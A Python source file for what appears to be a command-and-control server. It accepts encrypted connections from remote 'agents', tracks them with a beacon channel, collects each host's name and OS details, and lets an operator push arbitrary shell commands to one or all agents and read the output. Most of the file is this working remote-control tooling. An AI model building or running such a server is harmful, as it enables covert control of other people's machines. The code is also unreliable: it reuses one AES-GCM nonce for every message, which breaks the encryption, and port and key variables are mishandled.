import socket
import platform
import os
import sys
import subprocess
import signal
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import threading
import datetime
import json
import random
import time
import ctypes

os_info = {
        "OS Name": os.name,
        "System": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Platform": platform.platform(),
        "Architecture": platform.architecture()[0]
    }

n_agents = 0

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
b_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# List to store connected clients
agents = []
agents_lock = threading.Lock()

key = 0
nonce = 0

com_port = 0
bea_port = 0

class Agent:
    b_sock=0
    sock = 0
    address = 0
    name = 0
    beacon_n = 0
    os_info = 0
    def __init__(self, agent_sock, agent_address, beacon_sock, agent_id):
        self.sock = agent_sock
        self.address = agent_address
        self.b_sock = beacon_sock
        self.id = agent_id

def start_listen():
    global agents
    global n_agents

    #sIp = input("Enter listen interface (server's ip): ")
    
    # Bind the socket to an available port on localhost
    sock.bind(('0.0.0.0', 0))  # 0 means to bind to an available port
    b_sock.bind(('0.0.0.0', 0))

    # Get the port number
    port = sock.getsockname()[1]
    print("*Start communicate channel on port: {}".format(port))
    com_port = port

    port = b_sock.getsockname()[1]
    print("*Start beacon channel on port: {}".format(port))
    bea_port = port
    
    # Listen for connections (optional)
    sock.listen(64)
    b_sock.listen(64)
    try:
        while True:
            client_socket, client_address = sock.accept()
            beacon_socket, client_address = b_sock.accept()

            nonce_ = sec_recv(client_socket, key, nonce)
            if nonce_ == nonce:
                # Start a new thread to handle the client
                print("\n*New connection from {}".format(client_address))
                with agents_lock:
                    n_agents+=1
                    nAgent = Agent(client_socket, client_address, beacon_socket, n_agents)
                    agents.append(nAgent)  # Add client to the list
                thread = threading.Thread(target=handle_beacon, args=(nAgent,))
                thread.start()
    except:
        pass

def handle_beacon(agent):
    global agents
    agent.beacon_n = random.randint(0, 2**32)
    sec_sendall(agent.beacon_n.to_bytes(64,byteorder='big'),agent.b_sock, key, nonce)
    
    with agents_lock:
        aName = sec_recv(agent.sock, key, nonce).decode()
        agents[agents.index(agent)].name = aName
        aOs_info = json.loads(sec_recv(agent.sock, key, nonce))
        agents[agents.index(agent)].os_info = aOs_info
        
    agent.name = aName
    agent.os_info = aOs_info

    while True:
        try:
            if int.from_bytes(sec_recv(agent.b_sock, key, nonce), byteorder='big') == agent.beacon_n:
                agent.beacon_n+=1
                sec_sendall(agent.beacon_n.to_bytes(64,byteorder='big'),agent.b_sock, key, nonce)
            else:
                agent.sock.close()
                agent.b_sock.close()
                with agents_lock:
                    agents.remove(agent)
                return
        except:
            agent.sock.close()
            agent.b_sock.close()
            with agents_lock:
                try: agents.remove(agent)
                except: pass

def on_exit(signal_number, frame):
    print("Closing...")

    # Close all agent connections
    for agent in agents:
        agent.sock.close()
        agent.b_sock.close()

    # Close the socket
    sock.close()

    exit(0)

def ask_privileges():
    os_type = os_info["System"]

    if os_type == "Windows":
        # Request admin privileges on Windows
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("Need administrator privileges!\nHint: Run as administrator ...")
            exit(1)
    
    elif os_type == "Linux" or os_type == "Darwin":  # Darwin is macOS
        # Use sudo for Linux/macOS
        if os.geteuid() != 0:
            print("Need administrator privileges!\nHint: sudo ...")
            
def create_skey():
    # Generate a random 256-bit (32-byte) AES key and a 96-bit (12-byte) nonce
    global key
    key = os.urandom(32)    # 32 bytes = 256 bits
    global nonce
    nonce = os.urandom(12)  # 12 bytes for AES-GCM nonce (recommended size)

    print("*Secret key: {}\n*nonce: {}".format(base64.b64encode(key).decode("utf-8"),base64.b64encode(nonce).decode("utf-8")))

def encrypt_mess(message: bytes, key: bytes, nonce: bytes) -> (bytes, bytes):
    # Initialize AES-GCM cipher with the key and nonce
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Encrypt the message and get the authentication tag
    encrypted_message = encryptor.update(message) + encryptor.finalize()
    tag = encryptor.tag  # 16 bytes authentication tag
    
    return encrypted_message, tag

def sec_sendall(message: bytes, sock: socket, key, nonce):
    eMess, tag = encrypt_mess(message, key, nonce)
    send = json.dumps({"enc_mess":base64.b64encode(eMess).decode(),"tag":base64.b64encode(tag).decode()})
    s_len = len(send)
    sock.sendall(s_len.to_bytes(4, byteorder="big") + send.encode())

    return s_len

def decrypt_mess(encrypted_message: bytes, key: bytes, nonce: bytes, tag: bytes) -> bytes:
    # Initialize AES-GCM cipher with the key, nonce, and tag
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    
    # Decrypt the message
    decrypted_message = decryptor.update(encrypted_message) + decryptor.finalize()
    
    return decrypted_message

def sec_recv(sock: socket, key, nonce) -> bytes:
    d_len = int.from_bytes(sock.recv(4), byteorder="big")
    data = sock.recv(d_len)
    json_obj = json.loads(data)
    mess = decrypt_mess(base64.b64decode(json_obj["enc_mess"].encode()), key, nonce, base64.b64decode(json_obj["tag"].encode()))

    return mess

def sec_sendall2all(message: bytes, agents: list, key, nonce):
    for agent in agents:
        sec_sendall(message, agent.sock, key, nonce)

def excute_cmd(cmd_args: list): ###
   try:
    match cmd_args[0]:
        case "":
            return
        case "agents":
            agents_cmd(cmd_args)
        case "server":
            server_cmd(cmd_args)
        case "agent_exec":
            agent_exec_cmd(cmd_args)
        case "help":
            with open("help.txt",'r') as help_:
                print(help_.read())
        case _:
            print("*Unknown command. Please type \"help\" for help.")
   except:
    print("*Unknown command. Please type \"help\" for help.")

def agent_exec_cmd(cmd_args: list):
    match cmd_args[1]:
        case "all":
            agent_cmd = "exec " + cmd_args[2]
            if cmd_args[2][0] == "\"":
                i = 3
                agent_cmd += cmd_args[i]
                while cmd_args[i][-1] != "\"":
                    i+=1
                    agent_cmd += cmd_args[i]
            sec_sendall2all(agent_cmd.encode(),agents, key, nonce)
            for agent in agents:
                print("Agent's id: {}\nAgent's name: {}\nAgent's address: {}\nAgent's output:\n{}\n\n---\n"
                      .format(agent.id, agent.name, agent.address, sec_recv(agent.sock,key,nonce).decode()))
        
        case "id":
            for agent in agents:
                if(str(agent.id)==cmd_args[2]):
                    agent_cmd = "exec " + cmd_args[3]
                    if cmd_args[3][0] == "\"":
                        i = 4
                        agent_cmd += cmd_args[i]
                        while cmd_args[i][-1] != "\"":
                            i+=1
                            agent_cmd += cmd_args[i]
                    sec_sendall(agent_cmd.encode(),agent.sock, key, nonce)

        case "help":
            with open("help.txt",'r') as help_:
                print(help_.read())
        case _:
            print("*Unknown command. Please type \"help\" for help.")

def agents_cmd(cmd_args: list):
    match cmd_args[1]:
        case "list":
            print("Number of agents: {}\n\n---\n".format(len(agents)))
            for agent in agents:
                print("Agent's id: {}\nAgent's name: {}\nAgent's address: {}\nAgent's system: {}\n\n---\n"
                      .format(agent.id, agent.name, agent.address, agent.os_info["System"]))
        
        case "id":
            for agent in agents:
                if(str(agent.id)==cmd_args[2]):
                    print("Agent's id: {}\nAgent's name: {}\nAgent's address: {}\nAgent's OS info:"
                            .format(agent.id, agent.name, agent.address))
                    for key, value in agent.os_info.items():
                        print("{}: {}".format(key,value))
        
        case "remove":
            for agent in agents:
                if(str(agent.id)==cmd_args[2]):
                    agent.sock.close()
                    agent.b_sock.close()
                    with agents_lock:
                        agents.remove(agent)

        case "remove_all":
            for agent in agents:
                agent.sock.close()
                agent.b_sock.close()
            with agents_lock:
                agents.clear()

        case "help":
            with open("help.txt",'r') as help_:
                print(help_.read())
        case _:
            print("*Unknown command. Please type \"help\" for help.")

def server_cmd(cmd_args: list):
    match cmd_args[1]:
        case "status":
            print("Server's communicate port: {}\nServer's beacon port: {}\nServer's secret key: {}\nServer's nonce: {}\nServer's OS info:".format(com_port,bea_port,base64.b64encode(key).decode("utf-8"),base64.b64encode(nonce).decode("utf-8")))
            for key, value in os_info.items():
                print("{}: {}".format(key,value))

        case "help":
            with open("help.txt",'r') as help_:
                print(help_.read())
        case _:
            print("*Unknown command. Please type \"help\" for help.")

## temp
# Bind the signal handlers for Ctrl+C and termination signals
signal.signal(signal.SIGINT, on_exit)  # Handles Ctrl+C
signal.signal(signal.SIGTERM, on_exit)  # Handles kill command

#Star main
if __name__ == "__main__":
    ask_privileges()

    server_thread = threading.Thread(target=start_listen)
    server_thread.daemon = True  # Allows the server thread to exit when the main thread exits
    server_thread.start()

    # Bind the signal handlers for Ctrl+C and termination signals
    signal.signal(signal.SIGINT, on_exit)  # Handles Ctrl+C
    signal.signal(signal.SIGTERM, on_exit)  # Handles kill command

    create_skey()
    
    cmd = input("> ")
    cmd_args = cmd.split()
    print("***")
    excute_cmd(cmd_args)
    while True:
        print("***")
        cmd = input(">")
        cmd_args = cmd.split()
        print("***")
        excute_cmd(cmd_args)

'''
LOCK FOR SHARED VARIABLE
more cmd
'''

